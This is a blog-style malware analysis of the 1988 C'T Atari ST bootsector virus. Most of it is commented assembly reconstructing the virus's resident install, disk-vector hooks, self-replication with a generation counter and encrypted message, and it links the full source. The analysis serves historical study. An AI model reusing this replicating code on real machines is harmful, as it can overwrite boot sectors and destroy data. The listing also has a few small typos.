Title: The (probably) first open-source self-mutating virus
Slug: CTVirus
Date: 2024-08-24 13:19
Modified: 2024-08-24 13:19
Location: Montreal / Canada
Category: Atari ST, Virus
Lang: en
Author: shazz
Summary: Decades before github, some virus code available freely!
status: published

## Introduction

After a first stop with the Ghost Virus, I reverse engineered other bootsector viruses which will appear on this blog soon. The latest one on my desk is the C'T Virus.
His name doesn't describe his symptoms but his origin. C'T, stands for Computer & Technik, is a well known technical German magazine which is still alive by the way!
And in his July 1988 issue, dedicated to computer viruses, a pretty in depth article from Thomas Koziel and Guido Leister. The author claims that his ST was infected by a virus brought by his friend on a floppy disk and it erased his hard drive. So they disassembled and reverse engineered the virus (like I did) and provided even some small programs to fix it.

Even if I have some doubts on this article, 36 years later, I was pretty happy to find it scanned and compare my results with theirs. And it really helped me to figure out some parts I did not understand and some other parts they did not fully understand. And anyway, after the Ghost Virus I found pretty fascinating, this one was going one step further, by auto-mutating copies after copies but I'll describe this part later.

I'll give more insights in the conclusion but I'm pretty sure this virus, again, was made to show off, to impress as the technical required are not common and, except due to a bug, it was basically harmless.

That's enough for now, let's dig into the code!

## High level specs

To summarize and before going into the details, here are the main characteristics of the C'T 7/88 Virus:

 - **executable bootsector** virus
 - **stealth execution at boot** using an undocumented technique
 - protects itself against overwriting
 - replaces the original **HDV_BPB vector** and **HDV_MEDIACH vector**
 - replicates itself on non executable bootsectors (on any drive unit, floppy or not in some cases, which causes the hard fatal drive bug)
 - mutates one word at each replication (which serves as an offspring generation counter)
 - activates symptoms after the 20th generation
 - symptoms message is encrypted


## The details

As usual, I disassembled the virus bootsector using Easy Rider, imhex and then testing the re-assembling using my own made Test Tool. I finally found the C'T article that I translated and you can you the original article and the translation here. It helped me also to understand some weird bytes at the end, basically the "original" bootsector image I was using is corrupted (and looks to be used by most of the ST antivirus), it doesn't prevent the virus to work but the "symptoms", the text message, was corrupted with random characters.

So let's start.

### The Loader

First of all, important to notice, the executable bootsector entry point is not a traditional `BRA` (branch) but a `BSR` (branch sub routine). This is used to get the `DSKBUF` address where the bootsector is copied by the TOS directly in the stack. That's dumb but it took me time to understand the first instruction after the `BSR` (at this time I did not notice it was a `BSR`) :

```asm
MOVEA.L   (sp)+,A0
SUBQ.L    #2,A0
```

Basically, it means:
- Load `A0` with the address of `DSKBUF` + the `BSR`
- Go back of 2 bytes to be located before the `BSR` (it's a `BSR.B` so 2 bytes)

Then, this entry code will check that the virus in not yet installed in stealth memory (`MEMTOP - 0x200`) by checking:
- is the magic number (see details in the Ghost Virus post) set at the beginning to indicate a resident program
- is a custom virus ID (`VIRUS_ID: 0x07A31CDF) set a few bytes after (10) to distinguish the virus from any resident program using the same address.

If not the case, this first part of the code will branch the `INSTALL_RESIDENT_VECTOR` routine to install the virus.

So here is the bootsector loader with more details:

```asm
; ----------------------------------------------------------------------------------------------------------
; Constants
; ----------------------------------------------------------------------------------------------------------
FLOPPY_BUFFER               equ $4C6
RESIDENT_MAGIC              equ $12123456
RESIDENT_CHK                equ $5678
VIRUS_ID                    equ $07A31CDF
MEMTOP                      equ $436                ; long |End of TPA (user memory)                        |_memtop (0x0f8000 on 1040)
BOOTDEV                     equ $446                ; word |Default boot device,                            |_bootdev
                                                    ; This value represents the device from which the system was booted (0 = A:, 1 = B:, etc.)
HDV_MEDIACH                 equ $47E                ; long |Vector for hard disk media change               |hdv_mediach
HDV_BPB                     equ $472                ; long |Vector for getbpb for hard disk                 |hdv_bpb
BOOTSECTOR_START            equ $611E
GENERATION_TRIGGER          equ $14
GENERATION

; variables location
; translated from original listing
; OFFSET structure, 30 bytes data, matching the size of the bootsector reserved floppy descriptor
OFFSET_MAGIC_WORD           equ $0            ;vir_mem      dc.l #12123456  ; First magic long word
OFFSET_RESIDENT_ADDRESS     equ $04           ;             dc.l $000f7e00  ; Start address in memory
OFFSET_BRA                  equ $08           ;             bra  vir_head   ; The second installation phase begins with this branch. (INSTALL_RESIDENT_VECTOR)
OFFSET_VIRUS_ID             equ $0A           ;             dc.l $07a31cdf  ; 2nd magic long word
OFFSET_GENERATION           equ $0E           ;             dc.w $0010      ; Age of the virus
OFFSET_OLD_HDV_BPB          equ $10           ;             dc.l $00fc0de6  ; old vector hdv_bpb
OFFSET_OLD_HBD_MEDIACH      equ $14           ;             dc.l $00fc0f96  ; old vector hdb_mediach
OFFSET_DISKDATA1            equ $18           ;             dc.w $0900      ; Remains of the diskette structure information
OFFSET_DISKDATA2            equ $1A           ;             dc.w $0100
OFFSET_DISKDATA3            equ $1C           ;             dc.w $0000
OFFSET_RES_INSTALL_BRA      equ $1E           ;vir_head     bra  install_3  ; (MAGIC_ENTRY_POINT)

GENERATION                  equ START-$12     ; 0x0e
OLD_HDV_BPB_VECTOR          equ START-$10
OLD_HDV_MEDIACH_VECTOR      equ START-$C
SET_SYSTEM_VECTORS_BRANCH   equ START-2

        TEXT

; ----------------------------------------------------------------------------------------------------------
; Is used by
; ----------------------------------------------------------------------------------------------------------
HEADER:
        BRA.s     SET_SYSTEM_VECTORS

; ----------------------------------------------------------------------------------------------------------
; Code entry
; The system transfers control to the START routine as soon as the boot sector read is recognized as executable.
; ----------------------------------------------------------------------------------------------------------
START:
        MOVEA.L   (sp)+,A0                          ; poping the stack returns the starting memory address
                                                    ; as the bootsector start is BSR $20 (0x611e), return address in the stack
        SUBQ.L    #2,A0                             ; A0 points now to the beginning of the bootsector in DSKBUFP

        SUBA.L    A2,A2                             ; clear A2
        MOVEA.L   MEMTOP(A2),A1                     ; A1 = 0x436 => _memtop: $long |End of TPA (user memory),
                                                    ; This value points to the highest memory location available for the system heap.
                                                    ; This value is used to initialize GEMDOS free memory.
        SUBA.W    #$200,A1                          ; go to memtop - 512 bytes => A1

        CMPI.L    #RESIDENT_MAGIC,(A1)              ; check if resident vector is already setup
        BNE.S     INSTALL_RESIDENT_VECTOR
        CMPI.L    #VIRUS_ID,10(A1)                  ; check resident vector is the virus vector using virus identifier
        BNE       INSTALL_RESIDENT_VECTOR
        RTS
```

What to notice:
 1. As said the stack is used to set the `A0` register to the `DSKBUF` location without checking this system variable
 1. The virus will be installed in stealth memory at `MEMTOP - 0x200` which is at a 512 bytes boundary so compatible with the undocumented TOS resident program check.

Side notes:

As I did for the Ghost Virus, I added a list of constants and pointers to make the rest of the code easier to understand (and configurable), please refer to those constants when needed.

### INSTALL_RESIDENT_VECTOR

This routine will "patch" the bootsector copied in the `DSKBUF` buffer to replace 28 bytes reserved to describe the floppy (see the [bootsector format](/pages/boosector-en.html)) by the data structure required by the virus to operate, based on data spread in the bootsector data

As for the Ghost Virus, this routine will take care to correctly set up the resident program header, a BRA instruction to "jump over" the program variable structure (check the `OFFSET_` structure in the source constants), and finally adjust the double-page checksum to validate the resident program in order to be executed (and deleted) during the next warm reset.

```asm
; ----------------------------------------------------------------------------------------------------------
; Install virus in resident memory using undocumented trick
; Structure:
; 0.L: Magic value (RESIDENT_MAGIC)
; 4.L: Resident program address (A1=MEMTOP-$200) aligned at 512 bytes boundary
; 8.L: Resident code
; Double page (512 bytes) checksum has to be $5678
; At next reset, this part will be executed (and deleted)
; ----------------------------------------------------------------------------------------------------------
INSTALL_RESIDENT_VECTOR:
       ; Set the preprogram variables OFFSET_ structure which fits the resident program constraints and the boot sector reserved block
        MOVE.W    $GENERATION(A0),OFFSET_GENERATION(A0)         ; copy the generation counter from the bootsector to the generation variable
        MOVE.L    #RESIDENT_MAGIC,(A0)                          ; Add magic word 0x12123456 that TOS looks for
        MOVE.L    A1,OFFSET_RESIDENT_ADDRESS(A0)                ; add vector address
        MOVE.W    #$6014,OFFSET_BRA(A0)                         ; add branch to 22 (0x16) to jump over the data and reach the next BRA
        MOVE.L    #VIRUS_ID,OFFSET_VIRUS_ID(A0)                 ; add virus identifier
        MOVE.L    HDV_BPB(A2),OFFSET_OLD_HDV_BPB(A0)            ; add hdv_bpb vector
        MOVE.L    HDV_MEDIACH(A2),OFFSET_OLD_HBD_MEDIACH(A0)    ; add hdv_mediach vector

        ; compute magic checksum
        CLR.W     D1                                ; clear d1
        MOVE.W    #$FE,D0                           ; for d0 = 254 to 0
.copy_and_calc_checksum:
        MOVE.W    (A0),(A1)+                        ; copy
        ADD.W     (A0)+,D1                          ; compute work checksum
        DBF       D0,.copy_and_calc_checksum
        NEG.W     D1                                ; negate checksum
        ADD.W     #RESIDENT_CHK,D1                  ; add RESIDENT_CHK
        MOVE.W    D1,(A1)                           ; add checksum to A1
        RTS
```

In detals:

 1. Copy the `GENERATION` number from `DSKBUF`(hidden in the OEM reserved data) to the `OFFSET_GENERATION` variable
 1. It sets the magic number (`RESIDENT_MAGIC`) and location address (`A1`) in the header
 1. It adds the branch to jump over the variable structure (22 bytes)
 1. It saves the virus ID in the variables
 1. It saves the default `hdv_pbp` and `hbd_mediach` vectors in the variables
 1. It copies from `DSKBUF` (now Containing the fully working virus code) and at the same time computes the 512 bytes double page checksum and fix it to be `RESIDENT_CHK` (`0x5678`)
 1. resident program is now installed, the routine ends (`RTS`)
 1. Then, I must admit I don't know how it works but it seems the RTS will point to the `BRA` at `DISKBUF + 0x1E` instead of after the `BSR` and following the `BRA $86(PC)`, that will branch to `MAGIC_ENTRY_POINT`

### SET_SYSTEM_VECTORS

This routine, called after after the installation of the resident program, is setting the system vectors to "catch" any call to:
 - hdv_bpb: when a disk access is called
 - hdv_mediach: when a media is changed

It also protects itself from being overwritten by other applications by "reducing" the available of 512 bytes ST memory top boundary provided by
- Set the `MEMTOP` register to `MEMTOP - 0x200` so just before the resident program.
- Reduce the Gemdos available memory block length of 512 bytes

The routine also save the boot device number provided by the `_bootdev` register (can be also a hard drive!!!!) in the stack and call the `REPLICATE` routine (in case of the `SET_SYSTEM_VECTORS` was called by the resident program after a resset)

```asm
; ----------------------------------------------------------------------------------------------------------
; SET_SYSTEM_VECTORS
; ----------------------------------------------------------------------------------------------------------
SET_SYSTEM_VECTORS:
        SUBA.L    A2,A2                             ; A2 = 0
        SUBI.L    #$200,MEMTOP(A2)                  ; Change memtop to protect itself by reducing of 512 bytes
        SUBI.L    #$200,$496(A2)                    ; Change Gemdos first free memory block 0f 512 bytes

        ; $00048E|long |Memory descriptor block                              |themd
        ;    typedef struct md
        ;    {
        ;       struct md *m_link; /* pointer to next block $48e*/
        ;       VOIDP m_start; /* pointer to start of block $492*/
        ;   =>  LONG m_length; /* length of block $496 */
        ;       BASEPAGE *m_own; /* pointer to basepage of owner $49A*/
        ;    } MD;

        LEA       HDV_BPB_VECTOR(PC),A0
        MOVE.L    A0,HDV_BPB(A2)                    ; set HDV_BPB_VECTOR in hdv_bpb vector

        LEA       HDV_MEDIACH_VECTOR(PC),A0
        MOVE.L    A0,HDV_MEDIACH(A2)                ; set HDV_BPB_VECTOR in hdv_mediach vector

        MOVE.W    BOOTDEV(A2),-(sp)                 ; store default device in stack
        BSR.S     REPLICATE                         ; replicate the virus
        ADDQ.L    #2,sp                             ; fix stack
        RTS
```

### REPLICATE AND MUTATE

This routine is called in 3 places:

 - at the end of the system vectors installation routine (`SET_SYSTEM_VECTORS`)
 - if the `hdv_hpb` vector is called
 - if the `hdv_mediach` vector is called

And it is managing the replication part of the virus but also trigger the symptoms in a special case.
This is where the self-mutating capability starts. At the 6th byte of the bootsector, instead of reserved OEM data, the virus stores here the generation number, meaning, like in a ancestry tree, how many generations of this virus existed before. Each time the virus is replicated, the generation number is equals to the virus generation + 1.
So, while the virus is in memory,assuming it is in generation `n`, any new floppy infected will have a generation number of `n+1`.
If the Atari is cold-reseted (memory totally erased) and boots with a newly infected floppy, the current generation number will be `n+1` and new offsprings `n+2`. And so on.

And... the symptoms will only sho if the generation if more than 20. So if you got infected by the "original" virus (1st generation), at least 20 infections after 20 cold resets will be needed to show the symptoms.
For example, the Sagrotan virus database contains the generation 16, so before it was recorded by Henrik Alt, at least 16 generations have spread (in the lab? Nobody knows)

You get the mutation part. Pretty cool, no?

So, now what this routine does:

 - It loads a location in RAM to store the bootsector (FLOPPY_BUFFER)
 - Retrieves the boot device from the stack (0: A, 1: B...)
 - Use the `rwabs` system call to read the 1st sector of the 1st track: the boot sector
 - Check if the bootsector is executable (classic word checksum of $1234), just do nothing if this is the case to keep the floppy usable
 - Else patch the floppy buffer containing the floppy bootsector and:
   - Write the `BSR` bootsector start and virus ID
   - Write the generation number from the current resident virus, incremented by 1
   - Copy the virus code starting from the `START-2` `BRA`
 - Use `Protobt` system call to create the full executable bootsector based on this buffer
 - Use again the `rwabs` system call this time to write back the bootsector
 - Check the current virus generation and call the symptoms routine if the generation is more than 20 (`GENERATION_TRIGGER`)


```asm
; ----------------------------------------------------------------------------------------------------------
; Replication routine
; stack: bootdev.W
; ----------------------------------------------------------------------------------------------------------
REPLICATE:
        MOVEM.L   A0-A3/D0-D2,-(sp)
        MOVEA.L   FLOPPY_BUFFER.L,A3                ; floppy buffer addr in A3
        MOVE.W    4(sp),-(sp)                       ; dev = get bootdev from stack? BSR + 2 on stack

        ; read bootsector
        CLR.W     -(sp)                             ; recno = 0
        MOVE.W    #1,-(sp)                          ; count = 1
        PEA       (A3)                              ; buf = A3
        MOVE.W    #2,-(sp)                          ; mode = 2 / Disable retries
        MOVE.W    #4,-(sp)                          ; LONG Rwabs( mode, buf, count, recno, dev)
        TRAP      #$D
        ADDA.W    #$E,sp                            ; fix stack
        TST.L     D0                                ; check for error
        BNE       .do_nothing
        MOVEA.L   A3,A0                             ; copy buffer addr to A0
        CLR.W     D1                                ; d1 = 0
        MOVE.W    #$FF,D0                           ; for D0 = 255 to 0
.calc_checksum:
        ADD.W     (A0)+,D1                          ; calc word checksum
        DBF       D0,.calc_checksum
        CMP.W     #$1234,D1                         ; check if already executable
        BEQ.S     .do_nothing

        ; create bootsector buffer with virus
        MOVEA.L   A3,A0                             ; if not, copy buffer addr in A0
        MOVE.W    #BOOTSECTOR_START,(A0)+           ; add bootsector branch
        MOVE.L    #VIRUS_ID,(A0)+                   ; add virus identifier

        MOVE.W    GENERATION(PC),D0                 ; get relocated counter in d0
        ADDQ.W    #1,D0                             ; d0 = d0 + 1
        MOVE.W    D0,(A0)+                          ; copy incremented counter to buffer

        ADDA.W    #$16,A0                           ; advance buffer of 22 bytes
        LEA       SET_SYSTEM_VECTORS_BRANCH(PC),A1  ; A1 =  SET_SYSTEM_VECTORS_BRANCH (START - 2) with bra
        MOVE.W    #$F0,D0                           ; for d0 = 240 to 0
.copy:
        MOVE.W    (A1)+,(A0)+                       ; copy virus to buffer
        DBF       D0,.copy

        ; generate bootsector from buffer
        MOVE.W    #1,-(sp)                          ; execflag = 1 (executable)
        MOVE.W    #$FFFF,-(sp)                      ; type unchanged
        MOVE.L    #$FFFFFFFF,-(sp)                  ; serial
        PEA       (A3)                              ; buffer
        MOVE.W    #$12,-(sp)                        ; VOID Protobt( buf, serial, type, execflag ) => create bootsector
        TRAP      #$E
        ADDA.W    #$E,sp                            ; fix stack

        ; write back bootsector
        MOVE.W    4(sp),-(sp)                       ; dev = get bootdev from stack
        CLR.W     -(sp)                             ; recno = 0
        MOVE.W    #1,-(sp)                          ; count = 1
        PEA       (A3)                              ; buffer
        MOVE.W    #3,-(sp)                          ; mode = 3 Do not translate logical sectors into physical sectors (recno specifies physical instead of logical sectors)
        MOVE.W    #4,-(sp)                          ; LONG Rwabs( mode, buf, count, recno, dev)
        TRAP      #$D
        ADDA.W    #$E,sp                            ; fix stack

        MOVE.W    GENERATION(PC),D0                 ; get counter in D0
        CMP.W     #GENERATION_TRIGGER,D0            ; if d0 == GENERATION_TRIGGER  (in $f7f78)
        BLE       .do_nothing
        BSR.S     PRINT_MESSAGE                     ; print message
.do_nothing:
        MOVEM.L   (sp)+,A0-A3/D0-D2
        RTS
```

### The symptoms

The symptoms are pretty harmless, basically it shows the following message `ARRRGGGHHH Diskvirus hat wieder zugeschlagen' (ARRRGGGHHH Disk Virus has struck again) on the screen. That's it. The only interesting point is that the message is encrypted using a typical XOR operation so that looking at the bootsector data, the message doesn't show up directly.

The routine uses the Bios `Bconout` system call to display character by character and uses TOS Ascii codes to use inverse video.


```asm
; ----------------------------------------------------------------------------------------------------------
; Print message routine
; ----------------------------------------------------------------------------------------------------------
PRINT_MESSAGE:
        MOVE.L    A3,-(sp)                          ; keep A3 address in stack
        LEA       MESSAGE(PC),A3                    ; A3: message ptr
.decode_and_print:
        MOVE.B    (A3)+,D0                          ; get next character in d0
        BEQ.S     .end_of_message                   ; if not 0
        EORI.B    #$55,D0                           ; d0 = d0 XOR 85
        ROR.B     #3,D0                             ; d0 = d0 ROR 3
        MOVE.W    D0,-(sp)                          ; ch = d0
        MOVE.W    #2,-(sp)                          ; dev = 2 (Screen)
        MOVE.W    #3,-(sp)                          ; LONG Bconout(word dev, word ch)
        TRAP      #$D                               ; Bios
        ADDQ.L    #6,sp                             ; fix stack
        BRA.S     .decode_and_print                 ; loop
.end_of_message:
        MOVEA.L   (sp)+,A3                          ; reset A3
        RTS

; ----------------------------------------------------------------------------------------------------------
; data
; ----------------------------------------------------------------------------------------------------------
MESSAGE:
        ;      'ARRRGGGHHH <inverseVideo>Diskvirus</inverseVideo> hat wieder zugeschlagen' encoded
        DC.B      $5F,$C7,$C7,$C7,$C7,$6F,$6F,$6F
        DC.B      $17,$17,$17,$17,$54,$5C,$54,$8D
        DC.B      $D6,$54,$77,$1E,$CE,$0E,$E7,$1E
        DC.B      $C6,$FE,$CE,$54,$8D,$DE,$54,$16
        DC.B      $5E,$F6,$54,$EE,$1E,$7E,$76,$7E
        DC.B      $C6,$54,$86,$FE,$6E,$7E,$CE,$4E
        DC.B      $16,$36,$5E,$6E,$7E,$26
        DC.B      $54,$5C
        DC.B      $3D,$05,$00,$00,$00,$00,$00,$00
        DC.B      $00,$00,$00,$00,$00,$00,$00,$00
        DC.B      $00,$00,$00,$00,$00,$00,$00,$00
        DC.B      $00,$00
        DC.W      $1234
```

### The hdv_mediach Vector

This routine is installed by the `SET_SYSTEM_VECTORS` routine to replace the default `hdv_mediach` vector, this vector is used when `Mediach()` is called. A value of 0 here indicates that no hard disk is attached.
Applications installing themselves here should expect parameters to be located on the stack as they would be for the actual function call beginning at `4(sp)`. If the installed process services the call it should `RTS`, otherwise, leaving the stack intact, should `JMP` through the old vector value.

Basically, if the TOS or an application checks for a media change (to refresh any content for example), the routine will call the original vector then, if this media is not a hard drive, will trigger the `REPLICATE` routine. 

```asm
; ----------------------------------------------------------------------------------------------------------
; HDV_MEDIACH_VECTOR will be installed in vector
; ----------------------------------------------------------------------------------------------------------
HDV_MEDIACH_VECTOR:
        MOVE.W    4(sp),-(sp)                       ; by spec
        MOVEA.L   OLD_HDV_MEDIACH_VECTOR(PC),A0     ; get back original vector
        JSR       (A0)                              ; jmp to it
        ADDQ.L    #2,sp                             ; fix stack
        TST.W     D0                                ; check harddrive attached
        BLE       .on_hardrive_attached
        MOVE.W    4(sp),-(sp)                       ; add bootdev to stack
        BSR.S     REPLICATE                         ; if ok, call Replicate
        ADDQ.L    #2,sp                             ; fix stack
.on_hardrive_attached:
        RTS

```

### The hdv_hpb vector

This routine is installed by the `SET_SYSTEM_VECTORS` routine to replace the default `hdv_bpb` vector used when `Getbpb()` is called.
A value of 0 indicates that no hard disk is attached. Applications installing themselves here should expect parameters to be located on the stack as they would be for the actual function call beginning at `4(sp)`. If the installed process services the call it should `RTS`, otherwise, leaving the stack intact, should `JMP` through the old vector value.

Getbpb() returns the address of the current BPB (Bios Parameter Block) for a mounted device. So when the TOS or any application looks for the floppy descriptor, it will be called. This routine replacing the original vector will always call `REPLICATE` when `Getbpb()` is called (as normally it should be only for floppies) then call the original vector.


```asm
; ----------------------------------------------------------------------------------------------------------
; HDV_BPB_VECTOR will be installed in vector
; ----------------------------------------------------------------------------------------------------------
HDV_BPB_VECTOR:
        MOVE.W    4(sp),-(sp)                       ; by specs
        BSR.S     REPLICATE                         ; call replicate
        ADDQ.L    #2,sp                             ; fix stack
        MOVEA.L   OLD_HDV_BPB_VECTOR(PC),A0         ; get back original vector
        JMP       (A0)                              ; jmp to it
```

## Conclusion

After a few viruses I have reverse-engineered, this one was definitively more complex, especially due to the fact it hides some data in the bootsector reserved block and the way it reconstructs the virus code, from the bootsector by patching it and replacing all the reserved block to use this space as variable storage.

Definitively, even if there are some I think, some misunderstandings in the C'T commented code, this part was well described and it really helped me to complete the study. 

The mutation part, even if this is just 2 bytes, was really interesting and it took me some time to make the difference between the generation counter is the bootsector, the one in the DSKBUF and the last one in the Resident program. 
The heavy usage of the stack was also not an easy part, not always simple to remember what is and is not in the stack.

I also found interesting (and I thought it was not possible) to see the virus protecting itself from being overwritten by patching the system variables used to give back the available free RAM space (At least the top address).

A little like the Ghost Virus, 90% of the code is a technical achievement to show how to keep a virus stealthy in memory, replicating and so on while the symptoms part, at the end, is pretty limited. The Ghost Virus was inverting the mouse, the C'T virus is decrypting and displaying a message. Both when a certain condition is met, that's it. 


On another perspective, related to the C'T article and "the bug", my bet is that the original author of this virus did not have a hard drive to test (and in 1988, very few people had one, small and very expensive) and "trusted" the documentation. The `hdv_mediach` vector was checking it was not a hard drive to call the `REPLICATE` routine and the `hdv_bpb` vector should not apply to hard drive (in the docs) it but seems it is not the case.
But that's true, when the virus installs itself, that the `SET_SYSTEM_VECTORS` calls replicate whatever the `_bootdev` device is, and that may replace the hard drive bootsector.

On a final not, less technical and more on ethics... There were some doubts and reactions about this article, publishing a fully working and commented bootvirus in a magazine was a thing (and an be discussed) but also on who was the real author of this virus (the author claims it was on a floppy brought by his friend and as it erased his hard drive, they investigate), personnaly there are some parts of the reverse engineering that I don't understand how they got them without the original source code:

 - The definition of the variable space replacing the bootsector reserved block, some bytes were obvious, some totally not (the branchs)
 - the symptoms data are "clean" while on all bootsectors images I found in Atari ST antivirus, those last bytes were corrupted
 - the symptoms data finishes with an undocumented checksum, not used in the code

On the other side there are some mistakes or missing info but I guess it was on purpose. So you got it, I believe "his friend" was the real author of this virus and this article was a show off. But pretty well done I must admit.


As usual, you can download the full commented (and tested identical to the original virus after assembling with [vasm](http://www.compilers.de/vasm.html)) here: [CT.S]({attach}sources/CT.S)


## Appendices

### Fun facts

 - In the UVK book, there is a few mistakes (at least for the C'T version I found and the C'T listing) in the description:
    - `Discovery date: Summer 1988 (Wim Nottroth).`: I wonder... I would say C'T authors Thomas Koziel and Guido Leister were the first if not the authors themselves...
    - `Virus attaches itself to: Undocumented RESET resistant.`: as you saw the virus also attaches to `hdv_bpb` and `hdv_mediach` vectors
    - `What can happen: Deletes FAT of floppy-and hard disk (all data irretrievably lost).`: Possibly for hard drives due to be bug but not for floppies. Executable bootsectors are not replaced.
    - `When does that happen: If date stamp is 1987.`: no, only after the 20th virus generation. No date check.
    - `Can copy to hard disk: Yes.`: not really, let's say it thinks it is a floppy and erases the boot sector if not executable
 - In the bootsectors images I found, usually the data section containing the message was corrupted and filled by garbage following the text (causing display glitches)


### Still to do

 - I need to check the undocumented behavior that may cause the virus to try to replicate on a hard drive
 - I will provide a bugfixed version of it to prevent any hard drive issue
 - I need to understand how the bootsector code execution in `DSKBUF` jumps to `SET_SYSTEM_VECTORS`, mystery to me.


## Run the virus!

<div class="aside retro-computer">
	<div class="aside retro-computer__holder">
		<iframe style="border-radius:5px;background-color=white"
			src="/museum_hall.html?virus=CT" scrolling="auto" marginwidth="0" marginheight="0"
			width="652" height="404" frameBorder="1" loading="lazy"></iframe>
	</div>
</div>

</div>